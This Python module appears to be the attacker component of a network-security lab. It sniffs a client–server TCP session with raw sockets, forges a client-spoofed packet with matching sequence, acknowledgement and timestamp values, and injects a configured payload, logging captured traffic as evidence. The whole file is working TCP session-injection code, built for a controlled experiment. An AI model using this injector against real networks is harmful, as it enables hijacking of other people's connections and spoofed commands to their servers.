"""One-shot, fixed-target lab injector. No external attack or packet libraries."""
import os
import signal
import socket
import struct
import time
from pathlib import Path
from .common import evidence_dir, log
from .config import CLIENT_IP, SERVER_IP, ATTACKER_SERVER_IP, PORT, PAYLOAD
from .network import interface_for
from .packets import parse_frame, craft_packet, timestamps


def main():
    interface = interface_for(ATTACKER_SERVER_IP)
    active = os.environ.get("SCENARIO", "attack") != "baseline"
    running = True

    def stop(*_):
        nonlocal running
        running = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)
    candidate = None
    injected = False
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3)) as capture, \
            socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as sender, \
            (evidence_dir() / "traffic.pcap").open("wb") as pcap:
        capture.bind((interface, 0))
        capture.settimeout(0.25)
        sender.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        pcap.write(struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
        pcap.flush()
        log("attacker", "ready", interface=interface, active=active)
        Path("/tmp/attacker-ready").touch()
        while running:
            try:
                frame = capture.recv(65535)
            except socket.timeout:
                continue
            segment = parse_frame(frame)
            if segment is None:
                continue
            if not ((segment.src == CLIENT_IP and segment.dst == SERVER_IP and segment.dport == PORT)
                    or (segment.src == SERVER_IP and segment.dst == CLIENT_IP and segment.sport == PORT)):
                continue
            now = time.time_ns()
            pcap.write(struct.pack("<IIII", now // 10**9, (now % 10**9) // 1000, len(frame), len(frame)))
            pcap.write(frame)
            pcap.flush()
            log("attacker", "packet", src=segment.src, dst=segment.dst, sport=segment.sport,
                dport=segment.dport, seq=segment.seq, ack=segment.ack, flags=segment.flags,
                length=len(segment.payload), payload=segment.payload.decode("ascii", "replace"))
            if segment.src == SERVER_IP and segment.payload.startswith(b"STATUS records=3\n") and not injected:
                candidate = (segment.dport, segment.ack, segment.next_seq)
            if not active or injected or candidate is None:
                continue
            sport, expected_seq, expected_ack = candidate
            if not (segment.src == CLIENT_IP and segment.sport == sport and segment.flags == 0x10
                    and not segment.payload and segment.seq == expected_seq and segment.ack == expected_ack):
                continue
            ts = timestamps(segment.options)
            options = b"" if ts is None else b"\x01\x01\x08\x0a" + struct.pack("!II", *ts)
            packet = craft_packet(CLIENT_IP, SERVER_IP, sport, PORT, expected_seq,
                                  expected_ack, segment.window, PAYLOAD, options)
            (evidence_dir() / "forged-ip-packet.bin").write_bytes(packet)
            sender.sendto(packet, (SERVER_IP, 0))
            injected = True
            log("attacker", "injected", src=CLIENT_IP, dst=SERVER_IP, sport=sport, dport=PORT,
                seq=expected_seq, ack=expected_ack, payload=PAYLOAD.decode().strip(),
                bytes=len(packet), hex=packet.hex(), timestamp_option=ts)


if __name__ == "__main__":
    main()
